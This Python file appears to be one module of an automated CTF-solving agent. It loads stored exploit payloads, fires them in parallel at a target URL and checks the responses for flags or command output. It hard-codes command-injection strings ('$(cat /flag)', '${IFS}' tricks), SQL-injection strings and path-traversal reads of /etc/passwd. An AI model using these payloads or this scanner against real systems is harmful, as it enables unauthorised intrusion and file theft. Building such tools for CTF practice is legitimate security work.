"""
POC Scanner - POC 扫描接口
参考 ctfSolver 的 Hybrid POC + LLM 扫描模式

功能：
1. 从 experiences 中加载已知 POC
2. 并行扫描多个 POC
3. POC 未命中时触发 LLM 生成新解法
"""
import json
import re
import concurrent.futures
from typing import List, Dict, Any, Optional, Callable
from pathlib import Path


class POCResult:
    """POC 扫描结果"""
    def __init__(self, poc: str, success: bool, response: str = "", error: str = ""):
        self.poc = poc
        self.success = success
        self.response = response
        self.error = error

    def to_dict(self) -> Dict[str, Any]:
        return {
            "poc": self.poc,
            "success": self.success,
            "response": self.response,
            "error": self.error,
        }


class POCLoader:
    """POC 加载器 - 从 experiences 目录加载已知 POC"""

    def __init__(self, experiences_dir: Optional[str] = None):
        if experiences_dir is None:
            project_root = Path(__file__).parent.parent.parent
            experiences_dir = str(project_root / "ctf_direct" / "memories" / "experiences")
        self.experiences_dir = Path(experiences_dir)

    def load_pocs(self, problem_type: str) -> List[str]:
        """根据问题类型加载对应的 POC"""
        pocs = []

        # 根据题型加载对应经验文件
        type_to_file = {
            "rce": "rce.md",
            "command_injection": "rce.md",
            "code_execution": "rce.md",
            "sqli": "sqli.md",
            "sql_injection": "sqli.md",
            "file_inclusion": "file_inclusion.md",
            "file_upload": "file_upload.md",
        }

        filename = type_to_file.get(problem_type.lower())
        if not filename:
            return pocs

        poc_file = self.experiences_dir / filename
        if not poc_file.exists():
            return pocs

        try:
            content = poc_file.read_text(encoding="utf-8")
            pocs = self._extract_pocs(content, problem_type)
        except Exception as e:
            print(f"[POC Loader] Error loading {filename}: {e}")

        return pocs

    def _extract_pocs(self, content: str, problem_type: str) -> List[str]:
        """从经验文件中提取 POC"""
        pocs = []

        if problem_type in ["rce", "command_injection", "code_execution"]:
            # 提取命令注入 POC
            poc_patterns = [
                r';(\S+)',                    # ;command
                r'\|(\S+)',                   # |command
                r'`([^`]+)`',                  # `command`
                r'\$\(([^)]+)\)',             # $(command)
                r'/[^/\s]+/[^/\s]+/[^/\s]+', # /bin/cat /flag
            ]
            for pattern in poc_patterns:
                matches = re.findall(pattern, content)
                pocs.extend(matches)

            # 常用 RCE POC
            common_pocs = [
                ";cat /flag",
                "|cat /flag",
                "`cat /flag`",
                "$(cat /flag)",
                ";ls",
                "|ls",
                ";id",
                "|id",
                "cat${IFS}/flag",
                "cat$IFS$9/flag",
            ]
            pocs.extend(common_pocs)

        elif problem_type in ["sqli", "sql_injection"]:
            # 常用 SQL 注入 POC
            sqli_pocs = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "admin'--",
                "' OR 'a'='a",
            ]
            pocs.extend(sqli_pocs)

        elif problem_type in ["file_inclusion"]:
            # 常用文件包含 POC
            lfi_pocs = [
                "/etc/passwd",
                "../etc/passwd",
                "../../etc/passwd",
                "/etc/passwd%00",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
            ]
            pocs.extend(lfi_pocs)

        # 去重
        return list(set(pocs))


class POCScanner:
    """
    POC 扫描器 - 并行测试多个 POC

    使用方式：
    1. 加载 POC: loader.load_pocs(problem_type)
    2. 扫描 POC: scanner.scan(pocs, target_url, executor)
    3. 分析结果: scanner.analyze_results(results)
    """

    def __init__(self, max_workers: int = 5):
        self.max_workers = max_workers
        self.results: List[POCResult] = []

    def scan(
        self,
        pocs: List[str],
        target_url: str,
        executor_func: Callable[[str], str],
        timeout: float = 10.0,
    ) -> List[POCResult]:
        """
        并行扫描多个 POC

        Args:
            pocs: POC 列表
            target_url: 目标 URL
            executor_func: 执行函数，接收 POC 返回响应
            timeout: 单个 POC 超时时间

        Returns:
            扫描结果列表
        """
        if not pocs:
            return []

        print(f"[POC Scanner] 开始扫描 {len(pocs)} 个 POC...")
        self.results = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_poc = {
                executor.submit(self._scan_single, poc, target_url, executor_func, timeout): poc
                for poc in pocs
            }

            for future in concurrent.futures.as_completed(future_to_poc):
                poc = future_to_poc[future]
                try:
                    result = future.result(timeout=timeout + 1)
                    self.results.append(result)
                    if result.success:
                        print(f"[POC Scanner] POC 命中: {poc[:50]}...")
                except concurrent.futures.TimeoutError:
                    self.results.append(POCResult(poc, False, error="timeout"))
                except Exception as e:
                    self.results.append(POCResult(poc, False, error=str(e)))

        return self.results

    def _scan_single(
        self,
        poc: str,
        target_url: str,
        executor_func: Callable[[str], str],
        timeout: float,
    ) -> POCResult:
        """扫描单个 POC"""
        try:
            response = executor_func(poc)
            # 判断是否成功（根据响应内容判断）
            success = self._check_success(poc, response)
            return POCResult(poc, success, response)
        except Exception as e:
            return POCResult(poc, False, error=str(e))

    def _check_success(self, poc: str, response: str) -> bool:
        """判断 POC 是否成功"""
        response_lower = response.lower()

        # 成功标志
        success_indicators = [
            "flag{", "flag:", "flag is",
            "root:", "uid=", "gid=",
            "success", "welcome",
            "/flag", "/flag.txt",
        ]

        for indicator in success_indicators:
            if indicator in response_lower:
                return True

        # RCE 特定检测
        if "uid=" in response_lower and "gid=" in response_lower:
            return True

        # 文件包含特定检测
        if "root:" in response_lower and "daemon" in response_lower:
            return True

        return False

    def get_successful_pocs(self) -> List[POCResult]:
        """获取成功的 POC"""
        return [r for r in self.results if r.success]

    def get_failed_pocs(self) -> List[POCResult]:
        """获取失败的 POC"""
        return [r for r in self.results if not r.success]

    def analyze_results(self) -> Dict[str, Any]:
        """分析扫描结果"""
        total = len(self.results)
        successful = len(self.get_successful_pocs())
        failed = len(self.get_failed_pocs())

        analysis = {
            "total": total,
            "successful": successful,
            "failed": failed,
            "success_rate": successful / total if total > 0 else 0,
            "pocs": [r.to_dict() for r in self.results],
        }

        if successful > 0:
            best_poc = self.get_successful_pocs()[0]
            analysis["best_poc"] = best_poc.poc
            analysis["best_response"] = best_poc.response[:500] if best_poc.response else ""

        return analysis
